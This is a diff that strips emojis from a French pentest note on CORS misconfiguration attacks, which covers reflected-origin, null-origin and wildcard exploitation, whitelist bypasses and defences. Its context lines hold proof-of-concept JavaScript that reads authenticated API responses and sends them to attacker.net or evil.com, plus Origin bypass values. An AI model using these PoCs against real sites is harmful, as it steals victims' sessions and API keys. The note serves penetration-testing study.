@@ -12,7 +12,7 @@ statut: publie
 
 
 
-# 🌐 CORS — Cross-Origin Resource Sharing (attaques)
+# CORS — Cross-Origin Resource Sharing (attaques)
 
 > [!info] **En 1 phrase**
 > CORS = mécanisme du navigateur qui décide si une page peut lire une réponse d'une **autre origine** ;
@@ -23,7 +23,7 @@ statut: publie
 
 ---
 
-## 🎯 Concept
+## Concept
 
 ```mermaid
 sequenceDiagram
@@ -39,7 +39,7 @@ sequenceDiagram
     A->>A: Exfil vers attacker.net/log?key=data
 ```
 
-> [!info] 💡 **Pourquoi ça marche**
+> [!info] **Pourquoi ça marche**
 > Le navigateur bloque **par défaut** la lecture cross-origin (SOP). Mais si le serveur répond
 > `Access-Control-Allow-Origin` avec l'origine attaquante **+ `Access-Control-Allow-Credentials: true`**,
 > le navigateur autorise notre JS à **lire la réponse**. La requête part de toute façon (cookies inclus) —
@@ -47,7 +47,7 @@ sequenceDiagram
 
 ---
 
-## 📖 Rappel CORS — comment ça marche côté navigateur
+## Rappel CORS — comment ça marche côté navigateur
 
 ### Les 2 types de requêtes
 
@@ -74,7 +74,7 @@ Access-Control-Allow-Headers: content-type, authorization
 Access-Control-Max-Age: 3600
 ```
 
-> [!warning] ⚠️ **2 réponses à contrôler** : la réponse au `OPTIONS` (preflight) **et** la réponse à la vraie requête.
+> [!warning] **2 réponses à contrôler** : la réponse au `OPTIONS` (preflight) **et** la réponse à la vraie requête.
 > Beaucoup d'apps sont sûres sur l'une et vulnérables sur l'autre (ou l'inverse).
 
 ### Les 3 en-têtes à toujours vérifier
@@ -85,12 +85,12 @@ Access-Control-Max-Age: 3600
 | `Access-Control-Allow-Credentials` (ACAC) | Autorise les cookies cross-origin | `true` **avec** ACAO contrôlable = danger |
 | `Access-Control-Allow-Headers` | Headers autorisés au preflight | `authorization` autorisé = vol de Bearer possible |
 
-> [!warning] ⚠️ **Règle du navigateur** : `ACAO: *` **+** `ACAC: true` est **impossible légalement** (le navigateur refuse `*`
+> [!warning] **Règle du navigateur** : `ACAO: *` **+** `ACAC: true` est **impossible légalement** (le navigateur refuse `*`
 > quand les credentials sont demandés). Si tu vois les deux, l'une des deux valeurs est reflétée dynamiquement → creuse.
 
 ---
 
-## 🎯 Misconfigurations classiques
+## Misconfigurations classiques
 
 | # | Misconfig | Réponse vulnérable | Risque |
 |---|---|---|---|
@@ -103,12 +103,12 @@ Access-Control-Max-Age: 3600
 | 7 | **Double origine** | `evil.comvictim.com` | Selon la logique de validation |
 | 8 | **Wildcard partiel** | `*.example.com` accepté | Moyen/Critique selon l'implémentation |
 
-> [!warning] ⚠️ **Rappel spec** : `*` est le **seul** wildcard CORS valide. `https://*.example.com` n'existe pas côté
+> [!warning] **Rappel spec** : `*` est le **seul** wildcard CORS valide. `https://*.example.com` n'existe pas côté
 > navigateur ; si le serveur accepte cette valeur, c'est qu'il fait sa **propre validation** → testable.
 
 ---
 
-## 💥 Exploitation — Origin reflété
+## Exploitation — Origin reflété
 
 ### Implémentation vulnérable
 
@@ -125,7 +125,7 @@ Access-Control-Allow-Credentials: true
 {"api_key": "SECRET", "email": "victime@mail.com"}
 ```
 
-> [!tip] 💡 **Test 1er niveau** : relance la requête en changeant l'`Origin` dans Burp Repeater.
+> [!tip] **Test 1er niveau** : relance la requête en changeant l'`Origin` dans Burp Repeater.
 > Si elle est **reflétée telle quelle** dans `ACAO`, c'est vulnérable.
 
 ### PoC XHR (js, hébergé sur evil.com)
@@ -182,7 +182,7 @@ fetch('https://victim.example.com/endpoint', {
 
 ---
 
-## 📦 Exploitation — ACAO: null (iframe sandboxée)
+## Exploitation — ACAO: null (iframe sandboxée)
 
 > L'origine `null` est envoyée par : une **iframe sandboxée** (`sandbox` sans `allow-same-origin`),
 > un **iframe data: URI**, des redirections, des documents locaux. Le serveur qui fait
@@ -219,12 +219,12 @@ Access-Control-Allow-Credentials: true
   </script>"></iframe>
 ```
 
-> [!warning] ⚠️ **Piège** : l'iframe `data:` doit contenir l'attaque complète **en une seule URL** (pas de référence
+> [!warning] **Piège** : l'iframe `data:` doit contenir l'attaque complète **en une seule URL** (pas de référence
 > à une ressource externe pour le script). Encoder le payload ou l'écrire tel quel comme ci-dessus.
 
 ---
 
-## 🌐 Exploitation — Wildcard `*` (sans credentials)
+## Exploitation — Wildcard `*` (sans credentials)
 
 > Si `ACAO: *` **sans** `ACAC: true`, le navigateur **n'enverra jamais les cookies** (spec obligatoire).
 > L'attaque ne marche que sur des données **publiques / non authentifiées**, ce qui devient intéressant pour :
@@ -257,12 +257,12 @@ function reqListener() {
 };
 ```
 
-> [!tip] 💡 **Pivot interne** : demande à la victime de visiter le PoC depuis le **réseau interne** (phishing,
+> [!tip] **Pivot interne** : demande à la victime de visiter le PoC depuis le **réseau interne** (phishing,
 > watering hole, login obligatoire). Ton JS accède aux IP internes (`http://192.168.1.10/...`) si elles répondent `ACAO: *`.
 
 ---
 
-## 🧬 Bypass de mauvaises whitelists
+## Bypass de mauvaises whitelists
 
 > Quand le serveur ne reflète pas l'Origin mais la **compare** à une liste/d'une regex mal implémentée.
 
@@ -279,7 +279,7 @@ Origin: https://evilexample.com          # servi à partir d'un domaine que TU c
 Origin: https://apiiexample.com          # i remplace le point → accepté
 ```
 
-> [!warning] ⚠️ **Le point dans une regex** matche **n'importe quel caractère**. `^api\.example\.com$` (échappé)
+> [!warning] **Le point dans une regex** matche **n'importe quel caractère**. `^api\.example\.com$` (échappé)
 > ≠ `^api.example.com$` (faux). Teste `apiiexample.com`, `apixexample.com`...
 
 ### 3. Suffixe / double domaine
@@ -307,7 +307,7 @@ Origin: https://VICTIM.EXAMPLE.COM
 Origin: null.evil.com
 ```
 
-> [!tip] 💡 **Méthodo** : faire varier **une seule partie** de l'Origin à la fois et observer si `ACAO`
+> [!tip] **Méthodo** : faire varier **une seule partie** de l'Origin à la fois et observer si `ACAO`
 > la reflète. Le reflètement dans la réponse = acceptée. Automatise avec CORScanner (cf. Outils).
 
 ### 6. Race condition sur `Vary: Origin`
@@ -318,7 +318,7 @@ Origin: null.evil.com
 
 ---
 
-## 🔏 CORS + tokens (Bearer / cookies)
+## CORS + tokens (Bearer / cookies)
 
 ### Cas cookies (session classique)
 
@@ -363,7 +363,7 @@ fetch('https://api.victim.com/data', {
 }).then(r => r.text()).then(d => new Image().src = '//attacker.net/log?key=' + btoa(d));
 ```
 
-> [!warning] ⚠️ **Bearer ≠ automatique** : contrairement aux cookies, un Bearer n'est **pas envoyé** automatiquement.
+> [!warning] **Bearer ≠ automatique** : contrairement aux cookies, un Bearer n'est **pas envoyé** automatiquement.
 > L'attaque CORS seul ne vole un Bearer que si le navigateur le stocke d'une façon récupérable (cookie, localStorage
 > lisible par notre page) ou via XSS complémentaire. Le **cookie de session reste le vecteur principal**.
 
@@ -376,7 +376,7 @@ fetch('https://api.victim.com/data', {
 
 ---
 
-## 🔗 CORS avec d'autres vulns
+## CORS avec d'autres vulns
 
 ### XSS sur une origine trustée
 
@@ -394,7 +394,7 @@ fetch('https://api.victim.com/data', {
 </script>
 ```
 
-> [!tip] 💡 **Bonus** : un XSS même mineur sur un sous-domaine trusté (ex: `blog.example.com`) devient une
+> [!tip] **Bonus** : un XSS même mineur sur un sous-domaine trusté (ex: `blog.example.com`) devient une
 > **prise de contrôle totale des API** de `example.com` grâce à CORS.
 
 ### CORS + null origin
@@ -405,16 +405,16 @@ fetch('https://api.victim.com/data', {
 ### CORS + SSRF / pivot interne
 
 > `ACAO: *` sur des services internes (admin panels, APIs métier) = pont depuis le navigateur de la victime
-> vers l'interne. Association naturelle avec les découvertes faites en [[SSRF|🌐 SSRF]].
+> vers l'interne. Association naturelle avec les découvertes faites en [[SSRF| SSRF]].
 
 ### CORS + CSRF (actions d'état)
 
 > `ACAC: true` ne protège pas contre les **POST cross-origin** (les formulaires/envois partent toujours).
-> CORS rend le tout plus dangereux : on peut **envoyer l'action ET lire le résultat**. Voir [[CSRF|🔄 CSRF]].
+> CORS rend le tout plus dangereux : on peut **envoyer l'action ET lire le résultat**. Voir [[CSRF| CSRF]].
 
 ---
 
-## 🛠️ Outils
+## Outils
 
 | Outil | Type | Usage |
 |---|---|---|
@@ -440,14 +440,14 @@ curl -s -X OPTIONS -H "Origin: https://evil.com" -H "Access-Control-Request-Meth
      -H "Access-Control-Request-Headers: authorization" -i https://victim.com/api/data
 ```
 
-> [!warning] ⚠️ **curl ≠ navigateur** : curl affiche la réponse brute **peu importe** les headers CORS.
+> [!warning] **curl ≠ navigateur** : curl affiche la réponse brute **peu importe** les headers CORS.
 > Le navigateur, lui, **masque la réponse** à ton JS si les headers sont absents/mauvais.
 > Une réponse lisible en curl n'est pas forcément exploitable en CORS. L'inverse est vrai aussi : la vraie
 > validation se fait dans le navigateur → **tester avec une vraie page** (Burp Collaborator / domaine de test).
 
 ---
 
-## 🔍 Détection & Défense
+## Détection & Défense
 
 | Réponse | Détail |
 |---|---|
@@ -463,9 +463,9 @@ curl -s -X OPTIONS -H "Origin: https://evil.com" -H "Access-Control-Request-Meth
 
 ---
 
-## ⚠️ Tips & Pièges
+## Tips & Pièges
 
-> [!tip] 💡 **Ordre logique d'attaque**
+> [!tip] **Ordre logique d'attaque**
 > 1. Identifier un endpoint API sensible (auth requise).
 > 2. En Burp Repeater, injecter `Origin: https://evil.com` → la réponse reflète-t-elle ?
 > 3. Vérifier **les 3 headers** : `ACAO`, `ACAC`, `Allow-Headers`.
@@ -473,7 +473,7 @@ curl -s -X OPTIONS -H "Origin: https://evil.com" -H "Access-Control-Request-Meth
 > 5. Si OK → PoC complet (iframe `data:` pour `null`, page web sinon) → exfil vers ton serveur.
 > 6. Valide **dans un vrai navigateur** (les cookies, la session de la victime, le preflight).
 
-> [!warning] ⚠️ **Pièges classiques**
+> [!warning] **Pièges classiques**
 > - **ACAO: null ≠ invulnérable** : si la réponse contient `null`, teste immédiatement l'iframe sandboxée.
 > - **ACAC: true est la clé** : sans lui, même avec ACAO reflété, les **cookies ne partent pas** → impact réduit aux données publiques.
 > - **`*` ne marche jamais avec credentials** (spec) — si tu vois les deux, l'implémentation est custom → la tester.
@@ -484,18 +484,18 @@ curl -s -X OPTIONS -H "Origin: https://evil.com" -H "Access-Control-Request-Meth
 > - **Le scope** : tester aussi les sous-domaines API (`api.`, `internal.`, `admin.`) souvent moins protégés.
 > - **Exfil fiable** : `encodeURIComponent`/`btoa` la réponse avant de la mettre dans l'URL, sinon les caractères spéciaux cassent tout.
 
-> [!tip] 💡 **Rappel spec**
+> [!tip] **Rappel spec**
 > - `*` = seul wildcard valide ; `https://*.example.com` **n'est pas du CORS**.
 > - Le navigateur **n'envoie jamais les cookies** quand `ACAO: *` (même si JS met `withCredentials: true`).
 
 ---
 
-## 🔗 Liens
+## Liens
 
-- [[XSS (Cross-Site Scripting)|🖼️ XSS]]
-- [[SSRF|🌐 SSRF]]
-- [[Attaques JWT|🔏 JWT]]
-- [[CSRF|🔄 CSRF]]
-- → Note complète : [[03 - Exploitation Web|🌍 Exploitation Web]]
-- 📚 Source : [PayloadsAllTheThings — CORS Misconfiguration](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/CORS%20Misconfiguration/README.md)
-- 🧪 Labs : [PortSwigger — CORS](https://portswigger.net/web-security/all-labs#cross-origin-resource-sharing-cors) (origin reflection, trusted null origin, insecure protocols, internal pivot)
+- [[XSS (Cross-Site Scripting)| XSS]]
+- [[SSRF| SSRF]]
+- [[Attaques JWT| JWT]]
+- [[CSRF| CSRF]]
+- → Note complète : [[03 - Exploitation Web| Exploitation Web]]
+- Source : [PayloadsAllTheThings — CORS Misconfiguration](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/CORS%20Misconfiguration/README.md)
+- Labs : [PortSwigger — CORS](https://portswigger.net/web-security/all-labs#cross-origin-resource-sharing-cors) (origin reflection, trusted null origin, insecure protocols, internal pivot)
